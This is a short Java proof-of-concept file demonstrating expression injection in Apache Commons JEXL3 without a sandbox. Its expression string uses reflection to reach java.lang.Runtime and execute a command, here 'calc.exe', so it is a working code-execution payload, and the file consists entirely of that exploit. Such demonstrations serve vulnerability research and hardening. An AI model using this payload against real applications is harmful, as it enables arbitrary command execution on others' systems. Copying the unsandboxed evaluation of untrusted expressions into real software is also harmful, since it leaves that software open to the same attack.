package com.SugarP1g.jexlInject;

import org.apache.commons.jexl3.*;

public class POCWithoutSandbox {
    public static void main(String[] args) {
        JexlEngine je = new JexlBuilder().create();
        JexlContext jc = new MapContext();
        String exp = "1.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")";
        JexlExpression jex = je.createExpression(exp);
        System.out.println(jex.evaluate(jc));
    }
}
